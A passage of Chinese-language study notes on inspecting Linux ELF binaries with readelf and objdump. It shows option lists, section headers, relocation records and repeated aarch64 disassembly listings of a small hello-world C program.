   101: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND d[...]@GLIBC_2.17 (2)
   102: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
   103: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
   104: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   105: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   106: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
   107: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
   108: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
   109: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND i[...]@GLIBC_2.17 (2)
   110: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   111: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   112: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
   113: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.17 (2)
   114: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
   115: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND timegm@GLIBC_2.17 (2)
   116: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ioctl@GLIBC_2.17 (2)
   117: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
   118: 000000000002e270     8 OBJECT  GLOBAL DEFAULT   23 obstack_alloc_fa[...]
   119: 000000000000e4c0   336 FUNC    GLOBAL DEFAULT   13 _obstack_newchunk
   120: 000000000000e4a4    24 FUNC    GLOBAL DEFAULT   13 _obstack_begin_1
   121: 000000000000ee50    52 FUNC    GLOBAL DEFAULT   13 _obstack_allocated_p
   122: 000000000000e490    20 FUNC    GLOBAL DEFAULT   13 _obstack_begin
   123: 000000000000ef30    40 FUNC    GLOBAL DEFAULT   13 _obstack_memory_used
   124: 000000000000ee84   164 FUNC    GLOBAL DEFAULT   13 _obstack_free
```

- 顯示動態部分（-d) ==> readelf -d /bin/ls

  - 此選項顯示動態連結訊息，包括共享庫依賴項和版本控制詳細資訊。![image](https://hackmd.io/_uploads/BkLnnBw9a.png)

- 顯示`程式表頭program headers`（-l） ==> readelf -l /bin/ls

  - 程式頭描述了二進位檔案中段的佈局。此資訊對於理解記憶體映射和可執行檔的載入位址至關重要。![image](https://hackmd.io/_uploads/rJgRnrwcp.png)

- 顯示節標題及其內容 (-x)：此選項顯示特定節內容的十六進位和 ASCII 表示形式。

  - 例如，要檢查 .text 部分： ==> readelf -x .text /bin/ls![image](https://hackmd.io/_uploads/rk7W6BvcT.png)（太多了省略下半部）

- 顯示動態字串表(--dyn-syms) ==> readelf --dyn-syms /bin/ls
  - 此選項列印動態符號，這對於動態連結分析至關重要。![image](https://hackmd.io/_uploads/S1yraHw96.png)（太多了省略下半部）

---

# Linux 執行檔分析\_objdump

## 1.ELF 分析

- 指令參數

```=
-h	顯示區段頭section headers
-g	顯示除錯資訊
-l	顯示行號資訊
-p	顯示專有檔頭資訊，具體內容取決於檔案格式
-f	顯示檔案檔頭
-r 	顯示重定資訊
-R 	顯示動態連結重定資訊
-s 	顯示檔案所有內容
-W	顯示檔案中包含有DWARF 除錯資訊格式的區段
-t	顯示檔案的符號表
-T 	顯示動態連結符號表
-x 	顯示檔案的所有檔頭 --all header
```

- 範例程式
  ```c++
  //PLAYGROUND.c
  #include <stdio.h>
  int main(){
     printf("Wu YiHung\n");
     return 0;
  }
  ```
- 編譯指令 `gcc -o PLAYGROUND PLAYGROUND.c -g`
- 顯示區段頭section headers(-h)==>`objdump -h PLAYGROUND`
- 結果![image](https://hackmd.io/_uploads/rks4kLwcp.png)
  - 可以從最上面的數據得知，這是由arm架構編譯的
- 完整結果

```txt
PLAYGROUND:     file format elf64-littleaarch64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
0 .interp       0000001b  0000000000000238  0000000000000238  00000238  2**0
              CONTENTS, ALLOC, LOAD, READONLY, DATA
1 .note.gnu.build-id 00000024  0000000000000254  0000000000000254  00000254  2**2
              CONTENTS, ALLOC, LOAD, READONLY, DATA
2 .note.ABI-tags 00000020  0000000000000278  0000000000000278  00000278  2**2
              CONTENTS, ALLOC, LOAD, READONLY, DATA
3 .gnu.hash     0000001c  0000000000000298  0000000000000298  00000298  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
4 .dynsym       000000f0  00000000000002b8  00000000000002b8  000002b8  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
5 .dynstr       00000092  00000000000003a8  00000000000003a8  000003a8  2**0
              CONTENTS, ALLOC, LOAD, READONLY, DATA
6 .gnu.version  00000014  000000000000043a  000000000000043a  0000043a  2**1
              CONTENTS, ALLOC, LOAD, READONLY, DATA
7 .gnu.version_r 00000030  0000000000000450  0000000000000450  00000450  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
8 .rela.dyn     000000c0  0000000000000480  0000000000000480  00000480  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
9 .rela.plt     00000078  0000000000000540  0000000000000540  00000540  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
10 .init         00000018  00000000000005b8  00000000000005b8  000005b8  2**2
              CONTENTS, ALLOC, LOAD, READONLY, CODE
11 .plt          00000070  00000000000005d0  00000000000005d0  000005d0  2**4
              CONTENTS, ALLOC, LOAD, READONLY, CODE
12 .text         00000134  0000000000000640  0000000000000640  00000640  2**6
              CONTENTS, ALLOC, LOAD, READONLY, CODE
13 .fini         00000014  0000000000000774  0000000000000774  00000774  2**2
              CONTENTS, ALLOC, LOAD, READONLY, CODE
14 .rodata       00000012  0000000000000788  0000000000000788  00000788  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
15 .eh_frame_hdr 0000003c  000000000000079c  000000000000079c  0000079c  2**2
              CONTENTS, ALLOC, LOAD, READONLY, DATA
16 .eh_frame     000000ac  00000000000007d8  00000000000007d8  000007d8  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
17 .init_array   00000008  0000000000010d90  0000000000010d90  00000d90  2**3
              CONTENTS, ALLOC, LOAD, DATA
18 .fini_array   00000008  0000000000010d98  0000000000010d98  00000d98  2**3
              CONTENTS, ALLOC, LOAD, DATA
19 .dynamic      000001f0  0000000000010da0  0000000000010da0  00000da0  2**3
              CONTENTS, ALLOC, LOAD, DATA
20 .got          00000070  0000000000010f90  0000000000010f90  00000f90  2**3
              CONTENTS, ALLOC, LOAD, DATA
21 .data         00000010  0000000000011000  0000000000011000  00001000  2**3
              CONTENTS, ALLOC, LOAD, DATA
22 .bss          00000008  0000000000011010  0000000000011010  00001010  2**0
              ALLOC
23 .comment      0000002b  0000000000000000  0000000000000000  00001010  2**0
              CONTENTS, READONLY
24 .debug_aranges 00000030  0000000000000000  0000000000000000  0000103b  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
25 .debug_info   0000008c  0000000000000000  0000000000000000  0000106b  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
26 .debug_abbrev 00000043  0000000000000000  0000000000000000  000010f7  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
27 .debug_line   00000052  0000000000000000  0000000000000000  0000113a  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
28 .debug_str    000000c7  0000000000000000  0000000000000000  0000118c  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
29 .debug_line_str 00000023  0000000000000000  0000000000000000  00001253  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
```

- 查看重定表(Relocation Table) Examining the Relocation Section ==> `objdump -R PLAYGROUND`![image](https://hackmd.io/_uploads/BJJugIw9p.png)

  ```txt
  PLAYGROUND:     file format elf64-littleaarch64

  DYNAMIC RELOCATION RECORDS
  OFFSET           TYPE              VALUE
  0000000000010d90 R_AARCH64_RELATIVE  *ABS*+0x0000000000000750
  0000000000010d98 R_AARCH64_RELATIVE  *ABS*+0x0000000000000700
  0000000000010ff0 R_AARCH64_RELATIVE  *ABS*+0x0000000000000754
  0000000000011008 R_AARCH64_RELATIVE  *ABS*+0x0000000000011008
  0000000000010fd8 R_AARCH64_GLOB_DAT  _ITM_deregisterTMCloneTable@Base
  0000000000010fe0 R_AARCH64_GLOB_DAT  __cxa_finalize@GLIBC_2.17
  0000000000010fe8 R_AARCH64_GLOB_DAT  __gmon_start__@Base
  0000000000010ff8 R_AARCH64_GLOB_DAT  _ITM_registerTMCloneTable@Base
  0000000000010fa8 R_AARCH64_JUMP_SLOT  __libc_start_main@GLIBC_2.34
  0000000000010fb0 R_AARCH64_JUMP_SLOT  __cxa_finalize@GLIBC_2.17
  0000000000010fb8 R_AARCH64_JUMP_SLOT  __gmon_start__@Base
  0000000000010fc0 R_AARCH64_JUMP_SLOT  abort@GLIBC_2.17
  0000000000010fc8 R_AARCH64_JUMP_SLOT  puts@GLIBC_2.17
  ```

---

## 2.objdump逆向分析

- 指令參數

```
-d  --disassemble
    從objfile中對機器指令進行反彙編。本選項只對那些包含指令的section進行反彙編。
-D  --disassemble-all
    類似於-d，但是本選項會對所有的sections進行反彙編，而不僅僅是那些包含指令的sections。
    本選項會微妙的影響程式碼片段的反彙編。當使用-d選項的時候，objdump會假設代碼中出現的所有symbols都在對應
    的boundary範圍之內，並且不會跨boundary來進行反彙編； 而當使用-D選項時，則並不會有這樣的假設。這就
    意味著-d與-D選項在反彙編時，可能輸出結果會有些不同，比如當資料存放在程式碼片段的情況下。
-S 顯示原始碼和反組譯程式碼(包含－d 參數)
--prefix-addresses
    反彙編的時候，顯示每一行的完整位址。這是一種比較老的反彙編格式
```

### 範例1

- 編譯 `gcc -o PLAYGROUND PLAYGROUND.c -g`
- 反編譯1(使用att格式) ==> `objdump -S PLAYGROUND` (預設:使用AT&T語法)

  - 結果1

    ```c++
    yih@yih:~/Documents/C$ objdump -S PLAYGROUND

    PLAYGROUND:     file format elf64-littleaarch64

    Disassembly of section .init:

    00000000000005b8 <_init>:
     5b8:	d503201f 	nop
     5bc:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     5c0:	910003fd 	mov	x29, sp
     5c4:	9400002c 	bl	674 <call_weak_fn>
     5c8:	a8c17bfd 	ldp	x29, x30, [sp], #16
     5cc:	d65f03c0 	ret

    Disassembly of section .plt:

    00000000000005d0 <.plt>:
     5d0:	a9bf7bf0 	stp	x16, x30, [sp, #-16]!
     5d4:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     5d8:	f947d211 	ldr	x17, [x16, #4000]
     5dc:	913e8210 	add	x16, x16, #0xfa0
     5e0:	d61f0220 	br	x17
     5e4:	d503201f 	nop
     5e8:	d503201f 	nop
     5ec:	d503201f 	nop

    00000000000005f0 <__libc_start_main@plt>:
     5f0:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     5f4:	f947d611 	ldr	x17, [x16, #4008]
     5f8:	913ea210 	add	x16, x16, #0xfa8
     5fc:	d61f0220 	br	x17

    0000000000000600 <__cxa_finalize@plt>:
     600:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     604:	f947da11 	ldr	x17, [x16, #4016]
     608:	913ec210 	add	x16, x16, #0xfb0
     60c:	d61f0220 	br	x17

    0000000000000610 <__gmon_start__@plt>:
     610:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     614:	f947de11 	ldr	x17, [x16, #4024]
     618:	913ee210 	add	x16, x16, #0xfb8
     61c:	d61f0220 	br	x17

    0000000000000620 <abort@plt>:
     620:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     624:	f947e211 	ldr	x17, [x16, #4032]
     628:	913f0210 	add	x16, x16, #0xfc0
     62c:	d61f0220 	br	x17

    0000000000000630 <puts@plt>:
     630:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     634:	f947e611 	ldr	x17, [x16, #4040]
     638:	913f2210 	add	x16, x16, #0xfc8
     63c:	d61f0220 	br	x17

    Disassembly of section .text:

    0000000000000640 <_start>:
     640:	d503201f 	nop
     644:	d280001d 	mov	x29, #0x0                   	// #0
     648:	d280001e 	mov	x30, #0x0                   	// #0
     64c:	aa0003e5 	mov	x5, x0
     650:	f94003e1 	ldr	x1, [sp]
     654:	910023e2 	add	x2, sp, #0x8
     658:	910003e6 	mov	x6, sp
     65c:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     660:	f947f800 	ldr	x0, [x0, #4080]
     664:	d2800003 	mov	x3, #0x0                   	// #0
     668:	d2800004 	mov	x4, #0x0                   	// #0
     66c:	97ffffe1 	bl	5f0 <__libc_start_main@plt>
     670:	97ffffec 	bl	620 <abort@plt>

    0000000000000674 <call_weak_fn>:
     674:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     678:	f947f400 	ldr	x0, [x0, #4072]
     67c:	b4000040 	cbz	x0, 684 <call_weak_fn+0x10>
     680:	17ffffe4 	b	610 <__gmon_start__@plt>
     684:	d65f03c0 	ret
     688:	d503201f 	nop
     68c:	d503201f 	nop

    0000000000000690 <deregister_tm_clones>:
     690:	b0000080 	adrp	x0, 11000 <__data_start>
     694:	91004000 	add	x0, x0, #0x10
     698:	b0000081 	adrp	x1, 11000 <__data_start>
     69c:	91004021 	add	x1, x1, #0x10
     6a0:	eb00003f 	cmp	x1, x0
     6a4:	540000c0 	b.eq	6bc <deregister_tm_clones+0x2c>  // b.none
     6a8:	90000081 	adrp	x1, 10000 <__FRAME_END__+0xf780>
     6ac:	f947ec21 	ldr	x1, [x1, #4056]
     6b0:	b4000061 	cbz	x1, 6bc <deregister_tm_clones+0x2c>
     6b4:	aa0103f0 	mov	x16, x1
     6b8:	d61f0200 	br	x16
     6bc:	d65f03c0 	ret

    00000000000006c0 <register_tm_clones>:
     6c0:	b0000080 	adrp	x0, 11000 <__data_start>
     6c4:	91004000 	add	x0, x0, #0x10
     6c8:	b0000081 	adrp	x1, 11000 <__data_start>
     6cc:	91004021 	add	x1, x1, #0x10
     6d0:	cb000021 	sub	x1, x1, x0
     6d4:	d37ffc22 	lsr	x2, x1, #63
     6d8:	8b810c41 	add	x1, x2, x1, asr #3
     6dc:	9341fc21 	asr	x1, x1, #1
     6e0:	b40000c1 	cbz	x1, 6f8 <register_tm_clones+0x38>
     6e4:	90000082 	adrp	x2, 10000 <__FRAME_END__+0xf780>
     6e8:	f947fc42 	ldr	x2, [x2, #4088]
     6ec:	b4000062 	cbz	x2, 6f8 <register_tm_clones+0x38>
     6f0:	aa0203f0 	mov	x16, x2
     6f4:	d61f0200 	br	x16
     6f8:	d65f03c0 	ret
     6fc:	d503201f 	nop

    0000000000000700 <__do_global_dtors_aux>:
     700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
     704:	910003fd 	mov	x29, sp
     708:	f9000bf3 	str	x19, [sp, #16]
     70c:	b0000093 	adrp	x19, 11000 <__data_start>
     710:	39404260 	ldrb	w0, [x19, #16]
     714:	35000140 	cbnz	w0, 73c <__do_global_dtors_aux+0x3c>
     718:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     71c:	f947f000 	ldr	x0, [x0, #4064]
     720:	b4000080 	cbz	x0, 730 <__do_global_dtors_aux+0x30>
     724:	b0000080 	adrp	x0, 11000 <__data_start>
     728:	f9400400 	ldr	x0, [x0, #8]
     72c:	97ffffb5 	bl	600 <__cxa_finalize@plt>
     730:	97ffffd8 	bl	690 <deregister_tm_clones>
     734:	52800020 	mov	w0, #0x1                   	// #1
     738:	39004260 	strb	w0, [x19, #16]
     73c:	f9400bf3 	ldr	x19, [sp, #16]
     740:	a8c27bfd 	ldp	x29, x30, [sp], #32
     744:	d65f03c0 	ret
     748:	d503201f 	nop
     74c:	d503201f 	nop

    0000000000000750 <frame_dummy>:
     750:	17ffffdc 	b	6c0 <register_tm_clones>

    0000000000000754 <main>:
    //PLAYGROUND.c
    #include <stdio.h>
    int main(){
     754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     758:	910003fd 	mov	x29, sp
       printf("Wu YiHung\n");
     75c:	90000000 	adrp	x0, 0 <__abi_tag-0x278>
     760:	911e4000 	add	x0, x0, #0x790
     764:	97ffffb3 	bl	630 <puts@plt>
       return 0;
     768:	52800000 	mov	w0, #0x0                   	// #0
    }
     76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
     770:	d65f03c0 	ret

    Disassembly of section .fini:

    0000000000000774 <_fini>:
     774:	d503201f 	nop
     778:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     77c:	910003fd 	mov	x29, sp
     780:	a8c17bfd 	ldp	x29, x30, [sp], #16
     784:	d65f03c0 	ret
    ```

- 反編譯2(使用att格式) ==>`objdump -S -M att PLAYGROUND`

  - 結果2

    ```c++
    yih@yih:~/Documents/C$ objdump -S -M att PLAYGROUND

    PLAYGROUND:     file format elf64-littleaarch64

    Disassembly of section .init:

    00000000000005b8 <_init>:
     5b8:	objdump: unrecognised disassembler option: att
    d503201f 	nop
     5bc:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     5c0:	910003fd 	mov	x29, sp
     5c4:	9400002c 	bl	674 <call_weak_fn>
     5c8:	a8c17bfd 	ldp	x29, x30, [sp], #16
     5cc:	d65f03c0 	ret

    Disassembly of section .plt:

    00000000000005d0 <.plt>:
     5d0:	a9bf7bf0 	stp	x16, x30, [sp, #-16]!
     5d4:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     5d8:	f947d211 	ldr	x17, [x16, #4000]
     5dc:	913e8210 	add	x16, x16, #0xfa0
     5e0:	d61f0220 	br	x17
     5e4:	d503201f 	nop
     5e8:	d503201f 	nop
     5ec:	d503201f 	nop

    00000000000005f0 <__libc_start_main@plt>:
     5f0:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     5f4:	f947d611 	ldr	x17, [x16, #4008]
     5f8:	913ea210 	add	x16, x16, #0xfa8
     5fc:	d61f0220 	br	x17

    0000000000000600 <__cxa_finalize@plt>:
     600:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     604:	f947da11 	ldr	x17, [x16, #4016]
     608:	913ec210 	add	x16, x16, #0xfb0
     60c:	d61f0220 	br	x17

    0000000000000610 <__gmon_start__@plt>:
     610:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     614:	f947de11 	ldr	x17, [x16, #4024]
     618:	913ee210 	add	x16, x16, #0xfb8
     61c:	d61f0220 	br	x17

    0000000000000620 <abort@plt>:
     620:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     624:	f947e211 	ldr	x17, [x16, #4032]
     628:	913f0210 	add	x16, x16, #0xfc0
     62c:	d61f0220 	br	x17

    0000000000000630 <puts@plt>:
     630:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     634:	f947e611 	ldr	x17, [x16, #4040]
     638:	913f2210 	add	x16, x16, #0xfc8
     63c:	d61f0220 	br	x17

    Disassembly of section .text:

    0000000000000640 <_start>:
     640:	d503201f 	nop
     644:	d280001d 	mov	x29, #0x0                   	// #0
     648:	d280001e 	mov	x30, #0x0                   	// #0
     64c:	aa0003e5 	mov	x5, x0
     650:	f94003e1 	ldr	x1, [sp]
     654:	910023e2 	add	x2, sp, #0x8
     658:	910003e6 	mov	x6, sp
     65c:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     660:	f947f800 	ldr	x0, [x0, #4080]
     664:	d2800003 	mov	x3, #0x0                   	// #0
     668:	d2800004 	mov	x4, #0x0                   	// #0
     66c:	97ffffe1 	bl	5f0 <__libc_start_main@plt>
     670:	97ffffec 	bl	620 <abort@plt>

    0000000000000674 <call_weak_fn>:
     674:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     678:	f947f400 	ldr	x0, [x0, #4072]
     67c:	b4000040 	cbz	x0, 684 <call_weak_fn+0x10>
     680:	17ffffe4 	b	610 <__gmon_start__@plt>
     684:	d65f03c0 	ret
     688:	d503201f 	nop
     68c:	d503201f 	nop

    0000000000000690 <deregister_tm_clones>:
     690:	b0000080 	adrp	x0, 11000 <__data_start>
     694:	91004000 	add	x0, x0, #0x10
     698:	b0000081 	adrp	x1, 11000 <__data_start>
     69c:	91004021 	add	x1, x1, #0x10
     6a0:	eb00003f 	cmp	x1, x0
     6a4:	540000c0 	b.eq	6bc <deregister_tm_clones+0x2c>  // b.none
     6a8:	90000081 	adrp	x1, 10000 <__FRAME_END__+0xf780>
     6ac:	f947ec21 	ldr	x1, [x1, #4056]
     6b0:	b4000061 	cbz	x1, 6bc <deregister_tm_clones+0x2c>
     6b4:	aa0103f0 	mov	x16, x1
     6b8:	d61f0200 	br	x16
     6bc:	d65f03c0 	ret

    00000000000006c0 <register_tm_clones>:
     6c0:	b0000080 	adrp	x0, 11000 <__data_start>
     6c4:	91004000 	add	x0, x0, #0x10
     6c8:	b0000081 	adrp	x1, 11000 <__data_start>
     6cc:	91004021 	add	x1, x1, #0x10
     6d0:	cb000021 	sub	x1, x1, x0
     6d4:	d37ffc22 	lsr	x2, x1, #63
     6d8:	8b810c41 	add	x1, x2, x1, asr #3
     6dc:	9341fc21 	asr	x1, x1, #1
     6e0:	b40000c1 	cbz	x1, 6f8 <register_tm_clones+0x38>
     6e4:	90000082 	adrp	x2, 10000 <__FRAME_END__+0xf780>
     6e8:	f947fc42 	ldr	x2, [x2, #4088]
     6ec:	b4000062 	cbz	x2, 6f8 <register_tm_clones+0x38>
     6f0:	aa0203f0 	mov	x16, x2
     6f4:	d61f0200 	br	x16
     6f8:	d65f03c0 	ret
     6fc:	d503201f 	nop

    0000000000000700 <__do_global_dtors_aux>:
     700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
     704:	910003fd 	mov	x29, sp
     708:	f9000bf3 	str	x19, [sp, #16]
     70c:	b0000093 	adrp	x19, 11000 <__data_start>
     710:	39404260 	ldrb	w0, [x19, #16]
     714:	35000140 	cbnz	w0, 73c <__do_global_dtors_aux+0x3c>
     718:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     71c:	f947f000 	ldr	x0, [x0, #4064]
     720:	b4000080 	cbz	x0, 730 <__do_global_dtors_aux+0x30>
     724:	b0000080 	adrp	x0, 11000 <__data_start>
     728:	f9400400 	ldr	x0, [x0, #8]
     72c:	97ffffb5 	bl	600 <__cxa_finalize@plt>
     730:	97ffffd8 	bl	690 <deregister_tm_clones>
     734:	52800020 	mov	w0, #0x1                   	// #1
     738:	39004260 	strb	w0, [x19, #16]
     73c:	f9400bf3 	ldr	x19, [sp, #16]
     740:	a8c27bfd 	ldp	x29, x30, [sp], #32
     744:	d65f03c0 	ret
     748:	d503201f 	nop
     74c:	d503201f 	nop

    0000000000000750 <frame_dummy>:
     750:	17ffffdc 	b	6c0 <register_tm_clones>

    0000000000000754 <main>:
    //PLAYGROUND.c
    #include <stdio.h>
    int main(){
     754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     758:	910003fd 	mov	x29, sp
       printf("Wu YiHung\n");
     75c:	90000000 	adrp	x0, 0 <__abi_tag-0x278>
     760:	911e4000 	add	x0, x0, #0x790
     764:	97ffffb3 	bl	630 <puts@plt>
       return 0;
     768:	52800000 	mov	w0, #0x0                   	// #0
    }
     76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
     770:	d65f03c0 	ret

    Disassembly of section .fini:

    0000000000000774 <_fini>:
     774:	d503201f 	nop
     778:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     77c:	910003fd 	mov	x29, sp
     780:	a8c17bfd 	ldp	x29, x30, [sp], #16
     784:	d65f03c0 	ret
    ```

- 反編譯3(使用intel格式) ==>`objdump -S -M intel PLAYGROUND`

  - 結果3

    ```c++
    yih@yih:~/Documents/C$ objdump -S -M intel PLAYGROUND

    PLAYGROUND:     file format elf64-littleaarch64

    Disassembly of section .init:

    00000000000005b8 <_init>:
     5b8:	objdump: unrecognised disassembler option: intel
    d503201f 	nop
     5bc:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     5c0:	910003fd 	mov	x29, sp
     5c4:	9400002c 	bl	674 <call_weak_fn>
     5c8:	a8c17bfd 	ldp	x29, x30, [sp], #16
     5cc:	d65f03c0 	ret

    Disassembly of section .plt:

    00000000000005d0 <.plt>:
     5d0:	a9bf7bf0 	stp	x16, x30, [sp, #-16]!
     5d4:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     5d8:	f947d211 	ldr	x17, [x16, #4000]
     5dc:	913e8210 	add	x16, x16, #0xfa0
     5e0:	d61f0220 	br	x17
     5e4:	d503201f 	nop
     5e8:	d503201f 	nop
     5ec:	d503201f 	nop

    00000000000005f0 <__libc_start_main@plt>:
     5f0:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     5f4:	f947d611 	ldr	x17, [x16, #4008]
     5f8:	913ea210 	add	x16, x16, #0xfa8
     5fc:	d61f0220 	br	x17

    0000000000000600 <__cxa_finalize@plt>:
     600:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     604:	f947da11 	ldr	x17, [x16, #4016]
     608:	913ec210 	add	x16, x16, #0xfb0
     60c:	d61f0220 	br	x17

    0000000000000610 <__gmon_start__@plt>:
     610:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     614:	f947de11 	ldr	x17, [x16, #4024]
     618:	913ee210 	add	x16, x16, #0xfb8
     61c:	d61f0220 	br	x17

    0000000000000620 <abort@plt>:
     620:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     624:	f947e211 	ldr	x17, [x16, #4032]
     628:	913f0210 	add	x16, x16, #0xfc0
     62c:	d61f0220 	br	x17

    0000000000000630 <puts@plt>:
     630:	90000090 	adrp	x16, 10000 <__FRAME_END__+0xf780>
     634:	f947e611 	ldr	x17, [x16, #4040]
     638:	913f2210 	add	x16, x16, #0xfc8
     63c:	d61f0220 	br	x17

    Disassembly of section .text:

    0000000000000640 <_start>:
     640:	d503201f 	nop
     644:	d280001d 	mov	x29, #0x0                   	// #0
     648:	d280001e 	mov	x30, #0x0                   	// #0
     64c:	aa0003e5 	mov	x5, x0
     650:	f94003e1 	ldr	x1, [sp]
     654:	910023e2 	add	x2, sp, #0x8
     658:	910003e6 	mov	x6, sp
     65c:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     660:	f947f800 	ldr	x0, [x0, #4080]
     664:	d2800003 	mov	x3, #0x0                   	// #0
     668:	d2800004 	mov	x4, #0x0                   	// #0
     66c:	97ffffe1 	bl	5f0 <__libc_start_main@plt>
     670:	97ffffec 	bl	620 <abort@plt>
    0000000000000674 <call_weak_fn>:
     674:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     678:	f947f400 	ldr	x0, [x0, #4072]
     67c:	b4000040 	cbz	x0, 684 <call_weak_fn+0x10>
     680:	17ffffe4 	b	610 <__gmon_start__@plt>
     684:	d65f03c0 	ret
     688:	d503201f 	nop
     68c:	d503201f 	nop

    0000000000000690 <deregister_tm_clones>:
     690:	b0000080 	adrp	x0, 11000 <__data_start>
     694:	91004000 	add	x0, x0, #0x10
     698:	b0000081 	adrp	x1, 11000 <__data_start>
     69c:	91004021 	add	x1, x1, #0x10
     6a0:	eb00003f 	cmp	x1, x0
     6a4:	540000c0 	b.eq	6bc <deregister_tm_clones+0x2c>  // b.none
     6a8:	90000081 	adrp	x1, 10000 <__FRAME_END__+0xf780>
     6ac:	f947ec21 	ldr	x1, [x1, #4056]
     6b0:	b4000061 	cbz	x1, 6bc <deregister_tm_clones+0x2c>
     6b4:	aa0103f0 	mov	x16, x1
     6b8:	d61f0200 	br	x16
     6bc:	d65f03c0 	ret

    00000000000006c0 <register_tm_clones>:
     6c0:	b0000080 	adrp	x0, 11000 <__data_start>
     6c4:	91004000 	add	x0, x0, #0x10
     6c8:	b0000081 	adrp	x1, 11000 <__data_start>
     6cc:	91004021 	add	x1, x1, #0x10
     6d0:	cb000021 	sub	x1, x1, x0
     6d4:	d37ffc22 	lsr	x2, x1, #63
     6d8:	8b810c41 	add	x1, x2, x1, asr #3
     6dc:	9341fc21 	asr	x1, x1, #1
     6e0:	b40000c1 	cbz	x1, 6f8 <register_tm_clones+0x38>
     6e4:	90000082 	adrp	x2, 10000 <__FRAME_END__+0xf780>
     6e8:	f947fc42 	ldr	x2, [x2, #4088]
     6ec:	b4000062 	cbz	x2, 6f8 <register_tm_clones+0x38>
     6f0:	aa0203f0 	mov	x16, x2
     6f4:	d61f0200 	br	x16
     6f8:	d65f03c0 	ret
     6fc:	d503201f 	nop

    0000000000000700 <__do_global_dtors_aux>:
     700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
     704:	910003fd 	mov	x29, sp
     708:	f9000bf3 	str	x19, [sp, #16]
     70c:	b0000093 	adrp	x19, 11000 <__data_start>
     710:	39404260 	ldrb	w0, [x19, #16]
     714:	35000140 	cbnz	w0, 73c <__do_global_dtors_aux+0x3c>
     718:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     71c:	f947f000 	ldr	x0, [x0, #4064]
     720:	b4000080 	cbz	x0, 730 <__do_global_dtors_aux+0x30>
     724:	b0000080 	adrp	x0, 11000 <__data_start>
     728:	f9400400 	ldr	x0, [x0, #8]
     72c:	97ffffb5 	bl	600 <__cxa_finalize@plt>
     730:	97ffffd8 	bl	690 <deregister_tm_clones>
